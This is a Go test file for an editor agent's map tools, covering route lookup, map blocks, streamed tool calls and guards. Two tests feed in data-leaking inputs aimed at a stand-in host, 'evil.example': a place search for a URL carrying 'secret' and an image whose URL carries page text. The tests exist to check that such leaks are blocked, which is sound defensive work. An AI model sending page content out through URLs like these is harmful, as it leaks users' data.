package agents

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"leaflet/internal/doc"
	"leaflet/internal/maps"
)

func testRoute(line string) doc.MapRoute {
	walk := doc.EncodePath([]doc.LatLng{{Lat: 22.3825, Lng: 114.1873}, {Lat: 22.3784, Lng: 114.1918}}, doc.PathPrecision)
	ride := doc.EncodePath([]doc.LatLng{{Lat: 22.3784, Lng: 114.1918}, {Lat: 22.55206, Lng: 114.15382}}, doc.PathPrecision)
	return doc.MapRoute{Mode: doc.RouteTransit, Source: doc.RouteFromTransitous, DurationS: 3240, DistanceM: 27_000, Legs: []doc.MapLeg{
		{Mode: "walk", DurationS: 780, Path: walk},
		{Mode: "bus", Line: line, Agency: "Citybus", DurationS: 2400, Path: ride},
	}}
}

// mapExecutor finds the places and routes it is asked for without a
// network, keeping what it was asked.
func mapExecutor(c *doc.Content) (*Executor, *[]string) {
	var asked []string
	x := executor(c)
	x.Ctx.FindPlaces = func(q string, near *doc.LatLng) ([]maps.Place, error) {
		asked = append(asked, "place:"+q)
		if q == "Nowhere" {
			return nil, nil
		}
		return []maps.Place{{Name: q, Lat: 22.55206, Lng: 114.15382}}, nil
	}
	x.Ctx.FindRoutes = func(from, to doc.LatLng, mode string, depart time.Time) ([]doc.MapRoute, error) {
		asked = append(asked, "route:"+mode+":"+depart.Format("15:04"))
		if mode == doc.RouteWalk {
			return nil, maps.ErrNoRoute
		}
		return []doc.MapRoute{testRoute("B8"), testRoute("B7")}, nil
	}
	return x, &asked
}

func TestFindRouteThenAMapBlock(t *testing.T) {
	c := page()
	x, asked := mapExecutor(c)
	out := x.Call("find_route", map[string]any{"from": map[string]any{"name": "Sha Tin", "lat": 22.3825, "lng": 114.1873}, "to": "Heung Yuen Wai", "mode": "transit", "depart_at": "2026-11-26T09:00"})
	if e, ok := out["error"]; ok {
		t.Fatal(e)
	}
	routes := out["routes"].([]map[string]any)
	if len(routes) != 2 || routes[0]["id"] != "r1" || routes[1]["id"] != "r2" || routes[0]["duration_min"] != 54 {
		t.Fatalf("routes %+v", routes)
	}
	if got := strings.Join(*asked, " "); got != "place:Heung Yuen Wai route:transit:09:00" {
		t.Errorf("asked %s", got)
	}
	out = x.Call("insert_blocks", map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{
		map[string]any{"type": "map", "map": map[string]any{"title": "To the border", "route": "r2"}},
	}})
	if e, ok := out["error"]; ok {
		t.Fatal(e)
	}
	m := doc.MapOf(x.Ops[len(x.Ops)-1].Nodes[0])
	if m.Title != "To the border" || m.Route == nil || m.Route.Legs[1].Line != "B7" || len(m.Places) != 2 || m.Places[0].Name != "Sha Tin" || m.Places[1].Name != "Heung Yuen Wai" {
		t.Errorf("map %+v", m)
	}
	out = x.Call("write_markdown", map[string]any{"position": map[string]any{"at": "end"}, "markdown": "## Getting there\n\n```map\n{\"route\": \"r1\"}\n```"})
	if e, ok := out["error"]; ok {
		t.Fatal(e)
	}
	if nodes := x.Ops[len(x.Ops)-1].Nodes; len(nodes) != 2 || nodes[1].Type != "map" || doc.MapOf(nodes[1]).Route.Legs[1].Line != "B8" {
		t.Errorf("written %+v", nodes)
	}
	out = x.Call("insert_blocks", map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{
		map[string]any{"type": "map", "map": map[string]any{"route": "r9"}},
	}})
	if e, _ := out["error"].(string); !strings.Contains(e, "r9") {
		t.Errorf("an unknown route: %v", out)
	}
	if out := x.Call("find_route", map[string]any{"from": "Sha Tin", "to": "Nowhere", "mode": "transit"}); out["error"] == nil {
		t.Error("a route to a place not found")
	}
	if out := x.Call("find_route", map[string]any{"from": "Sha Tin", "to": "Tai Po", "mode": "walk"}); !strings.Contains(out["error"].(string), "No route") {
		t.Errorf("no route: %v", out)
	}
}

func TestAnswerResolvesMapFences(t *testing.T) {
	x, _ := mapExecutor(page())
	x.Call("find_route", map[string]any{"from": "A", "to": "B", "mode": "transit"})
	reply := x.Answer("Take the B8:\n\n```map\n{\"title\": \"B8\", \"route\": \"r1\"}\n```\n\n```map\n{\"route\": \"r7\"}\n```\n")
	nodes := doc.MarkdownBlocks(reply)
	if len(nodes) != 3 || nodes[1].Type != "map" || nodes[2].Type != "code" {
		t.Fatalf("nodes %+v from\n%s", nodes, reply)
	}
	if compact := doc.CompactMapFences(reply); strings.Contains(compact, `"path"`) || !strings.Contains(compact, `"duration_min":54`) {
		t.Errorf("compacted %s", compact)
	}
}

func TestMapToolsCloseAfterReadingAnotherPage(t *testing.T) {
	x, asked := mapExecutor(page())
	x.Ctx.ReadOtherPage = func(id string, _, _ int) map[string]any { return map[string]any{"page": map[string]any{"id": id}} }
	if out := x.Call("read_other_page", map[string]any{"page_id": "other"}); out["error"] != nil {
		t.Fatal(out)
	}
	for _, call := range []struct {
		name string
		args map[string]any
	}{
		{"find_place", map[string]any{"query": "Sha Tin"}},
		{"find_route", map[string]any{"from": "A", "to": "B", "mode": "drive"}},
	} {
		if out := x.Call(call.name, call.args); out["error"] == nil {
			t.Errorf("%s after reading another page: %v", call.name, out)
		}
	}
	if len(*asked) != 0 {
		t.Errorf("asked %v", *asked)
	}
	if out := executor(page()).Call("find_place", map[string]any{"query": "Sha Tin"}); out["error"] == nil {
		t.Error("found a place where the web is off")
	}
	x2, _ := mapExecutor(page())
	if out := x2.Call("find_place", map[string]any{"query": "https://evil.example/?q=secret"}); out["error"] == nil {
		t.Error("a place search for a web address")
	}
}

func TestReplaceMapKeepsItsRoute(t *testing.T) {
	data, err := doc.MapData(map[string]any{"title": "Old", "route": testRoute("B8")})
	if err != nil {
		t.Fatal(err)
	}
	c := doc.FromBlocks([]*doc.Node{{ID: "m", Type: "map", Data: data}})
	x := executor(c)
	replace := func(m map[string]any) doc.Map {
		t.Helper()
		out := x.Call("replace_block", map[string]any{"id": "m", "block": map[string]any{"type": "map", "map": m}})
		if e, ok := out["error"]; ok {
			t.Fatal(e)
		}
		op := x.Ops[len(x.Ops)-1]
		if err := c.Apply(op); err != nil {
			t.Fatal(err)
		}
		return doc.MapOf(op.Node)
	}
	// A map of a route alone, renamed: it needs no places.
	if m := replace(map[string]any{"title": "New"}); m.Title != "New" || m.Route == nil || len(m.Places) != 0 {
		t.Errorf("renamed %+v", m)
	}
	place := []any{map[string]any{"name": "Sha Tin", "lat": 22.3825, "lng": 114.1873}}
	if m := replace(map[string]any{"places": place}); m.Title != "New" || m.Route == nil || len(m.Places) != 1 {
		t.Errorf("places moved %+v", m)
	}
	if m := replace(map[string]any{"title": "Newer", "route": ""}); m.Title != "Newer" || m.Route == nil || len(m.Places) != 1 {
		t.Errorf("renamed again %+v", m)
	}
	if m := replace(map[string]any{"route": "none"}); m.Route != nil || m.Title != "Newer" || len(m.Places) != 1 {
		t.Errorf("none: %+v", m)
	}
	out := x.Call("replace_block", map[string]any{"id": "m", "block": map[string]any{"type": "map", "map": map[string]any{"places": []any{}}}})
	if e, _ := out["error"].(string); !strings.Contains(e, "places or a route") {
		t.Errorf("a map left with nothing on it: %v", out)
	}
}

func TestMapServicesCountAsTheWeb(t *testing.T) {
	image := map[string]any{"position": map[string]any{"at": "end"}, "blocks": []any{
		map[string]any{"type": "image", "image": map[string]any{"url": "https://evil.example/x.png?q=Ship+the+editor"}},
	}}
	for name, args := range map[string]map[string]any{
		"find_place": {"query": "Sha Tin"},
		"find_route": {"from": map[string]any{"lat": 22.3825, "lng": 114.1873}, "to": map[string]any{"lat": 22.55206, "lng": 114.15382}, "mode": "drive"},
	} {
		x, _ := mapExecutor(page())
		if out := x.Call(name, args); out["error"] != nil {
			t.Fatalf("%s: %v", name, out)
		}
		if !x.Guarded() {
			t.Errorf("%s leaves the run unguarded", name)
		}
		if out := x.Call("insert_blocks", image); out["error"] == nil {
			t.Errorf("after %s, a picture of an address no search found", name)
		}
	}
}

func TestFindRouteChecksItsWayAndTimeFirst(t *testing.T) {
	x, asked := mapExecutor(page())
	for _, args := range []map[string]any{
		{"from": "Sha Tin", "to": "Tai Po", "mode": "teleport"},
		{"from": "Sha Tin", "to": "Tai Po", "mode": "transit", "depart_at": "tomorrow morning"},
	} {
		if out := x.Call("find_route", args); out["error"] == nil {
			t.Errorf("%v: no error", args)
		}
	}
	if len(*asked) != 0 {
		t.Errorf("places found for a call refused: %v", *asked)
	}
	if out := x.Call("find_route", map[string]any{"from": "Sha Tin", "to": "Tai Po", "mode": " Drive "}); out["error"] != nil {
		t.Errorf("Drive: %v", out)
	}
	if got := strings.Join(*asked, " "); got != "place:Sha Tin place:Tai Po route:drive:00:00" {
		t.Errorf("asked %s", got)
	}
}

// scriptedStream answers each round with the next of its turns, streaming
// each call's arguments a few characters at a time, then its text.
type scriptedStream struct{ turns []ChatResult }

func (s *scriptedStream) Chat(ctx context.Context, model string, messages, tools []map[string]any, maxTokens int) (ChatResult, error) {
	return s.ChatStream(ctx, model, messages, tools, maxTokens, nil)
}

func (s *scriptedStream) ChatStream(_ context.Context, _ string, _, _ []map[string]any, _ int, on *Streamed) (ChatResult, error) {
	res := s.turns[0]
	s.turns = s.turns[1:]
	for i, c := range res.ToolCalls {
		for k := 1; k < len(c.Arguments); k += 7 {
			on.call(i, c.Name, c.Arguments[:k])
		}
		on.call(i, c.Name, c.Arguments)
	}
	if res.Content != "" {
		on.text(res.Content)
	}
	return res, nil
}

func TestStreamedMapsTakeTheirRoutes(t *testing.T) {
	saved := draftEvery
	t.Cleanup(func() { draftEvery = saved })
	draftEvery = 0
	c := page()
	x, _ := mapExecutor(c)
	fence := "```map\n{\"title\": \"By the B8\", \"route\": \"r1\"}\n```"
	markdown, _ := json.Marshal(fence)
	model := &scriptedStream{turns: []ChatResult{
		{ToolCalls: []ToolCall{{ID: "c1", Name: "find_route", Arguments: `{"from": "Sha Tin", "to": "Heung Yuen Wai", "mode": "transit"}`}}},
		{ToolCalls: []ToolCall{
			{ID: "c2", Name: "insert_blocks", Arguments: `{"position": {"at": "end"}, "blocks": [{"type": "map", "map": {"title": "By the B7", "route": "r2"}}, {"type": "paragraph", "text": "Or the B8:"}]}`},
			{ID: "c3", Name: "write_markdown", Arguments: `{"position": {"at": "end"}, "markdown": ` + string(markdown) + `}`},
		}},
		{Content: "Here it is:\n\n" + fence},
	}}
	var shown []string
	res, err := RunLocal(context.Background(), model, Request{Model: "m", SupportsTools: true, Web: true, Instruction: "go"}, x.Ctx,
		Events{Text: func(s string) { shown = append(shown, s) }, Revise: func(int, *doc.Op, string, []doc.Op) {}})
	if err != nil {
		t.Fatal(err)
	}
	var lines []string
	for _, n := range c.Children {
		if n.Type == "map" {
			if r := doc.MapOf(n).Route; r != nil {
				lines = append(lines, r.Legs[1].Line)
			}
		}
	}
	if strings.Join(lines, ",") != "B7,B8" || len(res.Ops) != 2 {
		t.Errorf("maps of lines %v, %d ops, page %s", lines, len(res.Ops), c.Encode())
	}
	if len(shown) == 0 || strings.Contains(shown[len(shown)-1], `"r1"`) || !strings.Contains(shown[len(shown)-1], `"legs"`) {
		t.Errorf("the answer showed as %q", shown)
	}
	if nodes := doc.MarkdownBlocks(res.Reply); len(nodes) != 2 || nodes[1].Type != "map" {
		t.Errorf("the reply kept %q", res.Reply)
	}
}

func TestDraftedMapOfARouteNotFound(t *testing.T) {
	c := page()
	x, _ := mapExecutor(c)
	raw := `{"position": {"at": "end"}, "markdown": "## Go\n\n` + "```map\\n{\\\"route\\\": \\\"r9\\\"}\\n```" + `"}`
	for k := 1; k <= len(raw); k++ {
		x.Draft("write_markdown", raw[:k])
	}
	out, ok := x.FinishDraft("write_markdown", raw)
	if e, _ := out["error"].(string); !ok || !strings.Contains(e, "r9") {
		t.Errorf("finished %v, %v", out, ok)
	}
	if len(c.Children) != 3 {
		t.Errorf("the draft stayed: %s", c.Encode())
	}
}

func TestMapToolsAreOfferedWithTheWeb(t *testing.T) {
	names := func(defs []map[string]any) string {
		var out []string
		for _, d := range defs {
			out = append(out, d["function"].(map[string]any)["name"].(string))
		}
		return strings.Join(out, ",")
	}
	if got := names(MapToolDefinitions()); got != "find_place,find_route" {
		t.Errorf("tools %s", got)
	}
	if !strings.Contains(webPrompt(true), "find_route") || !strings.Contains(webPrompt(false), "```map") {
		t.Error("the web's prompt says nothing of maps")
	}
	if errors.Is(nil, maps.ErrNoRoute) {
		t.Error("nil is no route")
	}
}
